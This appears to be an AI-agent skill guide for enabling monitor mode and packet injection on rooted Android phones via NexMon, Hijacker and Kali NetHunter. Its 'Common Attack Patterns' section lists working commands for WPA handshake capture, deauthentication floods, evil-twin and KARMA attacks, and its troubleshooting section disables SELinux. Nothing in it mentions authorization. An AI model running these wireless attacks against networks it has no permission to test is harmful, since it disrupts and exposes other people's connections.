---
name: android-nexmon-setup
description: How to enable monitor mode and packet injection on Android devices with Broadcom Wi-Fi chipsets using NexMon. Use this skill whenever the user wants to perform wireless penetration testing on Android, enable monitor mode on their phone, capture Wi-Fi handshakes, inject frames, set up wireless attacks from a mobile device, or configure Hijacker for automated monitor mode toggling.
---

# Android NexMon Setup: Monitor Mode & Packet Injection

This skill guides you through enabling 802.11 monitor mode and frame injection on Android devices with Broadcom/Cypress Wi-Fi chipsets using the NexMon framework. This eliminates the need for external USB adapters by patching the proprietary firmware.

## What This Skill Does

- Verifies device compatibility with NexMon
- Guides Magisk module installation
- Configures Hijacker for automated monitor mode
- Shows manual command-line alternatives
- Integrates with Kali NetHunter chroot
- Provides troubleshooting for common issues

## Quick Start

If you already have a compatible device and just need the commands:

```bash
# Enable monitor + injection
svc wifi disable && ifconfig wlan0 up && nexutil -s0x613 -i -v2

# Disable and return to normal Wi-Fi
nexutil -m0 && svc wifi enable
```

---

## Step 1: Verify Device Compatibility

NexMon only works with specific Broadcom/Cypress chipsets. Check your device:

```bash
# Method 1: Check via dmesg (requires root)
dmesg | grep -i bcm

# Method 2: Check via sysfs
cat /sys/kernel/debug/bcmdhd/ver

# Method 3: Use the helper script
./scripts/check_compatibility.sh
```

**Supported chipsets:**
- BCM4358 (Nexus 6P, Pixel 1)
- BCM4359 (Galaxy S7/S8)
- BCM43596 (Galaxy S9/S10)
- BCM4375B1 (Galaxy S10+)
- BCM43752 (Galaxy S20 series)

**Supported devices with public patches:**
- Samsung Galaxy S7, S8, S9, S10, S10+
- Google Pixel 1, Pixel XL
- Nexus 6P
- OnePlus 5, 5T, 6

If your device isn't listed, you may need to compile a custom patch from the NexMon source.

---

## Step 2: Prerequisites Checklist

Before proceeding, ensure you have:

- [ ] **Root with Magisk ≥ 24**
  ```bash
  magisk --version
  ```

- [ ] **BusyBox installed** (most ROMs/NetHunter include this)
  ```bash
  which busybox
  ```

- [ ] **NexMon Magisk ZIP** for your exact device/firmware
  - Download from: https://github.com/seemoo-lab/nexmon
  - Or use pre-built: https://github.com/SpaceNinja/nexmon

- [ ] **Hijacker app ≥ 1.7** (arm/arm64)
  - Download: https://github.com/chrisk44/Hijacker
  - Install the APK on your device

- [ ] **(Optional) Kali NetHunter** or Linux chroot for advanced tools

---

## Step 3: Flash the NexMon Magisk Module

### Installation Steps

1. **Download the ZIP** for your exact device/firmware combination
   - Example: `nexmon-s10.zip` for Galaxy S10
   - Place in `/sdcard/Download/`

2. **Install via Magisk**
   ```bash
   # Open Magisk app → Modules → Install from storage
   # Select the ZIP and reboot
   ```

3. **Verify installation**
   ```bash
   # Check libnexmon.so location
   ls -lZ $(find / -name libnexmon.so 2>/dev/null)
   
   # Verify nexutil is present
   which nexutil
   sha1sum $(which nexutil)
   ```

   Expected output:
   ```
   /data/adb/modules/nexmon/lib64/libnexmon.so
   /system/xbin/nexutil
   ```

### What the Module Does

The Magisk module:
- Copies `libnexmon.so` to `/data/adb/modules/<module>/lib*/`
- Installs `nexutil` CLI helper to `/system/xbin/`
- Sets correct SELinux labels
- Preloads the library into the Wi-Fi driver

---

## Step 4: Configure Hijacker (Recommended)

Hijacker automates monitor mode toggling before running tools like `airodump-ng` or `wifite`.

### Configuration Steps

1. **Open Hijacker → Settings → Advanced**

2. **Add these entries** (adjust library path if needed):

   **Prefix:**
   ```
   LD_PRELOAD=/data/user/0/com.hijacker/files/lib/libnexmon.so
   ```

   **Enable monitor mode:**
   ```
   svc wifi disable; ifconfig wlan0 up; nexutil -s0x613 -i -v2
   ```

   **Disable monitor mode:**
   ```
   nexutil -m0; svc wifi enable
   ```

3. **Enable** "Start monitor mode on airodump start"

4. **Create required directory** (if Hijacker shows errors):
   ```bash
   mkdir -p /storage/emulated/0/Hijacker
   ```

### Understanding the nexutil Flags

| Flag | Purpose | Value |
|------|---------|-------|
| `-s0x613` | Write firmware variable FCAP_FRAME_INJECTION | `1` (enable TX of arbitrary frames) |
| `-i` | Put interface in monitor mode | Radiotap header prepended |
| `-v2` | Verbose level | `2` prints confirmation and firmware version |
| `-m0` | Restore managed mode | Used in disable command |
| `-c <n>` | Set channel | Override ROM channel restrictions |

### Test the Configuration

After configuration, run:
```bash
airodump-ng --band abg wlan0
```

You should see raw 802.11 frames with radiotap headers.

---

## Step 5: Manual Mode (Without Hijacker)

If you prefer command-line control or Hijacker isn't available:

### Enable Monitor + Injection
```bash
# Disable Android Wi-Fi service (required!)
svc wifi disable

# Bring interface up
ifconfig wlan0 up

# Enable monitor mode + frame injection
nexutil -s0x613 -i -v2

# Verify
iwconfig wlan0
```

### Disable and Return to Normal
```bash
# Restore managed mode
nexutil -m0

# Re-enable Wi-Fi service
svc wifi enable
```

### Passive Sniffing Only
If you only need to capture (no injection):
```bash
svc wifi disable && ifconfig wlan0 up && nexutil -i -v2
```

---

## Step 6: Kali NetHunter Integration

Stock Kali tools don't know about NexMon. Force them to use it via `LD_PRELOAD`.

### Setup Steps

1. **Copy the shared object into the chroot:**
   ```bash
   # From Android host
   cp /sdcard/Download/kalilibnexmon.so <chroot>/lib/
   ```

2. **Enable monitor mode from Android host:**
   ```bash
   svc wifi disable && ifconfig wlan0 up && nexutil -s0x613 -i -v2
   ```

3. **Launch tools inside Kali with preload:**
   ```bash
   sudo su
   export LD_PRELOAD=/lib/kalilibnexmon.so
   
   # Now run any wireless tool
   wifite -i wlan0
   aircrack-ng --help
   mdk4 wlan0 d
   ```

4. **When finished, disable on Android:**
   ```bash
   nexutil -m0 && svc wifi enable
   ```

### Why This Works

The firmware handles radiotap injection at the driver level, so user-space tools behave like they're using an external Atheros adapter.

---

## Step 7: Common Attack Patterns

Once monitor + TX is active, you can perform:

### Capture WPA Handshakes
```bash
# Using wifite (automated)
wifite -i wlan0

# Using airodump-ng (manual)
airodump-ng --band abg --bssid <target> --channel <ch> -w capture wlan0
```

### Capture PMKID (No Client Required)
```bash
hcxdumptool -i wlan0 --enable-status-page --allow-own-traffic
```

### Deauthentication Attacks
```bash
# Force clients to reconnect
mdk4 wlan0 d -t <target_bssid> -c <channel>

# Or with aireplay-ng
aireplay-ng --deauth 10 -a <target_bssid> wlan0
```

### Rogue AP / KARMA Attacks
```bash
# Create evil twin
hostapd -C /tmp/evil.conf

# KARMA attack (respond to all probe requests)
mdk4 wlan0 a
```

### Performance Expectations

On Galaxy S10 (BCM4375B1):
- TX power: ~20 dBm
- RX rate: 2-3 M pps
- Comparable to external USB NICs

---

## Troubleshooting

### "Device or resource busy"
**Cause:** Android Wi-Fi service is still running.

**Fix:**
```bash
svc wifi disable
# Then retry nexutil commands
```

### "nexutil: ioctl(PRIV_MAGIC) failed"
**Cause:** Library is not pre-loaded.

**Fix:**
```bash
# Check LD_PRELOAD is set
export LD_PRELOAD=/data/adb/modules/nexmon/lib64/libnexmon.so

# Or verify installation
ls -lZ $(find / -name libnexmon.so 2>/dev/null)
```

### Frame injection works but no packets captured
**Cause:** ROM hard-blocks certain channels.

**Fix:**
```bash
# Try explicit channel
nexutil -c <channel>

# Or use iwconfig
iwconfig wlan0 channel <n>
```

### SELinux blocking library
**Cause:** SELinux in Enforcing mode.

**Fix:**
```bash
# Option 1: Set to Permissive (temporary)
setenforce 0

# Option 2: Fix module context
chcon u:object_r:system_lib_file:s0 libnexmon.so
```

### Monitor mode won't enable
**Cause:** Interface is in use or driver issue.

**Fix:**
```bash
# Kill any processes using wlan0
fuser -v /dev/wlan0

# Restart Wi-Fi service
svc wifi disable
svc wifi enable

# Then try again
svc wifi disable && ifconfig wlan0 up && nexutil -s0x613 -i -v2
```

---

## Verification Commands

Use these to confirm everything is working:

```bash
# Check monitor mode is active
iwconfig wlan0 | grep -i mode
# Should show: Mode:Monitor

# Test frame injection
aireplay-ng --test wlan0
# Should show: Injection is working!

# Verify firmware version
nexutil -v2
# Should print firmware version and confirmation

# Run the verification script
./scripts/verify_installation.sh
```

---

## References

- [NexMon – firmware patching framework](https://github.com/seemoo-lab/nexmon)
- [Hijacker (aircrack-ng GUI for Android)](https://github.com/chrisk44/Hijacker)
- [Kali NetHunter](https://www.kali.org/docs/nethunter/)
- [HackTricks – Android Pentesting](https://book.hacktricks.xyz/pentesting-mobile/android-pentesting)

---

## Quick Reference Card

| Task | Command |
|------|--------|
| Enable monitor + injection | `svc wifi disable && ifconfig wlan0 up && nexutil -s0x613 -i -v2` |
| Disable monitor mode | `nexutil -m0 && svc wifi enable` |
| Passive sniffing only | `svc wifi disable && ifconfig wlan0 up && nexutil -i -v2` |
| Set channel | `nexutil -c <channel>` |
| Check firmware version | `nexutil -v2` |
| Test injection | `aireplay-ng --test wlan0` |
| Verify installation | `./scripts/verify_installation.sh` |
| Check compatibility | `./scripts/check_compatibility.sh` |
